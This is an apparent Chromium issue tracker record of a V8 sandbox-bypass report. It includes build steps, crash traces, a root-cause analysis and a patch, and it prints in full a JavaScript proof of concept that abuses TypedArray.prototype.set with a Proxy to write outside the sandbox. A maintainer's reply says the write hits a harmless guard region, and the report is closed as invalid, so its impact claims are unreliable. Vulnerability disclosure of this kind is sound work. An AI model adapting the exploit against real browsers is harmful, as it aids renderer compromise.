# V8 Sandbox Bypass: OOB Write using %TypedArray%.prototype.set due to element type/size TOCTOU

| Field | Value |
|-------|-------|
| **Issue ID** | [508789134](https://issues.chromium.org/issues/508789134) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Sandbox |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | kr...@gmail.com |
| **Assignee** | ma...@chromium.org |
| **Created** | 2026-05-02 |
| **Bounty** | $7,000.00 |

## Description

---

### Report description

The SBXCHECK that today guards TypedArrayPrototype::set() against an ElementsKind-switcheroo write allows for a v8 sandbox escape

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

---

### The problem

#### Please describe the technical details of the vulnerability

#### Affected Versions Tested

- Chrome **147.0.7727.138** (latest stable, May 2 2026) — V8 14.7.173.22 (`c152c31c55c`)
- Chrome 147.0.7727.117 — V8 14.7.173.20 (`9b21082faf1`)
- V8 `branch-heads/14.7` HEAD (`adb62482a30`, V8 14.7.173.23) — used to capture the stack trace below
- Bug is in `src/objects/elements.cc`, host-OS independent. Verified on macOS arm64; equally exploitable on Linux x86\_64.

#### Steps to Reproduce

1. Check out V8 at `branch-heads/14.7` (or `main` — code path is unchanged):
   
   ```
   fetch v8 && cd v8 && git checkout branch-heads/14.7
   gclient sync
   
   ```
2. Build d8 with the bounty-rule configuration (no other flags needed):
   
   ```
   gn gen out/release --args='is_debug=false v8_enable_sandbox=true v8_enable_memory_corruption_api=true'
   ninja -C out/release d8
   
   ```
3. Save the test case below as `poc.js`.
4. Run:
   
   ```
   ./out/release/d8 --sandbox-testing poc.js
   
   ```
5. Observe `SIGBUS` / `EXC_BAD_ACCESS` at an address **outside** the sandbox bounds reported on stdout. Reproduces 4/4 deterministically; the sandbox base is randomised but the delta-past-end is constant.

# Expected Output

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0xed500000000,0xfd500000000)
Received signal 10 BUS_ADRALN 1014ffffffef

==== C stack trace ===============================
... TypedElementsAccessor<24, ...>::CopyElements ...
... Runtime_TypedArraySet ...

```

`crash_address - sandbox_end = 0x1014ffffffef - 0xfd500000000 = 0x3FFFFFFFEF` — the crash lands exactly **256 GiB - 17 bytes past the sandbox end**. This is a sandbox violation per V8's threat model (any write outside `[Sandbox.base, Sandbox.base + Sandbox.byteLength)`).

Crash stack (lldb on d8 14.7.173.23, debug symbols):

```
* thread #1, stop reason = EXC_BAD_ACCESS (code=2)
  frame #0: TypedElementsAccessor<BIGUINT64_ELEMENTS>::SetImpl(data_ptr, value=0x4141414141414141, is_shared)
            elements.cc
  frame #1: TypedElementsAccessor<BIGUINT64_ELEMENTS>::SetImpl(holder, entry, value)
            elements.cc:3535
  frame #2: TypedElementsAccessor<BIGUINT64_ELEMENTS>::CopyElementsHandleSlow(source, destination, length=1, offset)
            elements.cc:4422
  frame #3: TypedElementsAccessor<BIGUINT64_ELEMENTS>::CopyElementsHandleImpl(...length=1, offset...)
            elements.cc:4479    [proxy source falls through to slow path]
  frame #4: ElementsAccessorBase<BIGUINT64_ELEMENTS>::CopyElements(...)
            elements.cc:1259
  frame #5: __RT_impl_Runtime_TypedArraySet
            runtime-typedarray.cc:215
  frame #6: Runtime_TypedArraySet
            runtime-typedarray.cc:205

```
#### Root Cause

`TypedElementsAccessor<Kind>::CopyElementsHandleSlow` (the `TypedArrayPrototype::set` slow path taken when source is a Proxy / array-like / has getters) currently begins with this guard at `src/objects/elements.cc:4384`:

```
SBXCHECK(ElementsKindToByteSize(Kind) * length <=
         ArrayBuffer::kMaxByteLength);

```

**`offset` is not in the inequality.** With `length = 1` and `Kind = BIGUINT64_ELEMENTS`, it evaluates to `8 * 1 ≤ 2 GiB` — passes regardless of how large `offset` is. The loop then computes the destination address as `destination->DataPtr() + (offset + i) * stride`. With `offset = 32 GiB - 2` and 8-byte stride, that's `~256 GiB` past the destination's backing store — and well outside the sandbox.

The per-iteration check at `elements.cc:4416` (`new_length <= offset + i`) does not save us either: the second `Proxy[i]` trap call switches the destination's map back to `UINT8_ELEMENTS` before this check runs, so `new_length` is read as `0x7FFFFFFFF` (the buffer in 1-byte elements), `offset + i` is `0x7FFFFFFFE`, and the inequality is **false** — the loop falls through to `SetImpl`, which uses the template `Kind = BIGUINT64_ELEMENTS` captured earlier in `Runtime_TypedArraySet`. The 8-byte stride combined with the un-bounded `offset` produces the OOB write.

## Why this is a regression of [bug 435630461](https://issues.chromium.org/issues/435630461)

| Commit | Date | Effect |
| --- | --- | --- |
| `bebbd2a5489` / `fb9c0180801` | Sep 2025 | "[sandbox] Add checks to places where we access TypedArrays — part 1": added per-element `SBXCHECK(InsideSandbox(...))` in `SetImpl`. Effective. Commit message: *"This is still incomplete - other places need similar checks."* The regression test `test/mjsunit/sandbox/regress-435630461.js` (= attached `poc.js`) was added with this commit. |
| **`2daccd52428`** | **Sep 19 2025** | **"[sandbox] Faster and more robust sandbox checks for TypedArrays": removed the per-element `SBXCHECK(InsideSandbox(...))` from `SetImpl` and replaced it with the single up-front check above. The replacement omits `offset`.** |
| `3e6b9f2f40d` | Mar 2026 | "Fix another case of ElementsKind switcheroo in TypedArray.p.set" — sister bug `489633222`, edits the no-Proxy fast path; does not touch `CopyElementsHandleSlow`. |

The regression test was **never updated or removed** when commit `2daccd52428` re-introduced the gap. Running it today on V8 14.7.173.22 (Chrome 147.0.7727.138) still escapes the sandbox.

#### Suggested Patch

```
   static Tagged<Object> CopyElementsHandleSlow(
       DirectHandle<JSAny> source, DirectHandle<JSTypedArray> destination,
       size_t length, size_t offset) {
     Isolate* isolate = Isolate::Current();
-    // Guard against switching the ElementsKind to make this too big.
-    SBXCHECK(ElementsKindToByteSize(Kind) * length <=
-             ArrayBuffer::kMaxByteLength);
+    // Guard against switching the ElementsKind to make this too big.
+    // Must include `offset` — the in-loop runtime check on `new_length`
+    // re-reads destination metadata after the Proxy trap.
+    SBXCHECK(ElementsKindToByteSize(Kind) * (offset + length) <=
+             ArrayBuffer::kMaxByteLength);

```

Equivalently, validate the byte range `[offset * stride, (offset + length) * stride)` against the destination's `byte_length` read once before the loop. Either form must be evaluated against values frozen *before* the Proxy trap can run.

# Attachment

One file: `poc.js` (contents below — = `test/mjsunit/sandbox/regress-435630461.js` from the V8 tree, unmodified).

```
// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

const kHeapObjectTag = 1;
const kSandboxedPointerShift = 24n;
const kMaxSafeBufferSizeForSandbox = 32 * 1024 * 1024 * 1024 - 1;
const kMapOffset = 0;
const kBackingStoreOffset = 36;
const kExternalPointerOffset = 48;
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const getPtr = (obj) => Sandbox.getAddressOf(obj) + kHeapObjectTag;
const getField = (obj, offset) =>
    memory.getUint32(getPtr(obj) + offset - kHeapObjectTag, true);
const setField = (obj, offset, value) =>
    memory.setUint32(getPtr(obj) + offset - kHeapObjectTag, value, true);
const setField64 = (obj, offset, value) =>
    memory.setBigUint64(getPtr(obj) + offset - kHeapObjectTag, value, true);
const arrayBuffer = new ArrayBuffer(kMaxSafeBufferSizeForSandbox);
const dest = new Uint8Array(arrayBuffer);
const uint8ArrayMap = getField(dest, kMapOffset);
const u64s = new BigUint64Array(0);
const bigUint64ArrayMap = getField(u64s, kMapOffset);
dest.set(new Proxy({}, {
  get(_, name) {
    if (name === "length") {
      // Switch dest's map to BigUint64Array (8-byte stride). length=1 ⇒ the
      // SBXCHECK at the entry of CopyElementsHandleSlow trivially passes.
      setField(dest, kMapOffset, bigUint64ArrayMap);
      return 1;
    }
    // Switch back so the in-loop length re-check can't fire, plant a far-out
    // external_pointer so the resulting write lands outside the sandbox.
    setField(dest, kMapOffset, uint8ArrayMap);
    setField64(dest, kExternalPointerOffset,
               0xffffffffffn << kSandboxedPointerShift);
    return 0x4141414141414141n;
  }
}), kMaxSafeBufferSizeForSandbox - 1);

```
#### Impact analysis

Fully controlled 8-byte write outside the V8 sandbox, from arbitrary in-sandbox memory corruption — the exact property the V8 sandbox is designed to prevent.

The PoC, starting from the in-sandbox primitive granted by `--sandbox-testing` (`Sandbox.MemoryView` + `Sandbox.getAddressOf`), writes `0x4141414141414141` to an attacker-controlled address roughly **256 GiB past the V8 sandbox end**. Both the address (via `kExternalPointerOffset` plant) and the value (via `Proxy[idx]` return) are fully controlled by the attacker. Trivially generalises to arbitrary 8-byte W outside the cage.

Combined with any regular V8 type-confusion / UAF that yields the in-sandbox primitive, this is renderer compromise: write Mojo IPC structures, hijack code pointers in trusted space-adjacent regions, etc.

---

### The cause

#### What version of Chrome have you found the security issue in?

latest

#### Is the security issue related to a crash?

Yes, it is related to a crash.

#### Choose the type of vulnerability

Sandbox Escape

#### How would you like to be publicly acknowledged for your report?

pwn.ai

## Attachments

- [v8_sandbox_escape.js](attachments/v8_sandbox_escape.js) (text/javascript, 1.4 KB)
- [v8_sandbox_escape.js](attachments/v8_sandbox_escape_76230183.js) (text/javascript, 1.4 KB)

## Timeline

### ar...@google.com (2026-05-03)

Thanks for the report. I cannot reproduce this, the sandbox has a 288GB guard region after its end, the PoC triggers a fault in that region:

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x79b400000000,0x7ab400000000)
Caught harmless memory access violation (safe region). Exiting process...

```

### ch...@google.com (2026-05-03)

This issue has been closed as an incomplete or invalid report and we will not respond to further comments. If you can improve your report please open a fresh issue that addresses any feedback provided.

For more information on our vulnerability policies, please refer to <https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md>

### eb...@google.com (2026-08-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/508789134)*
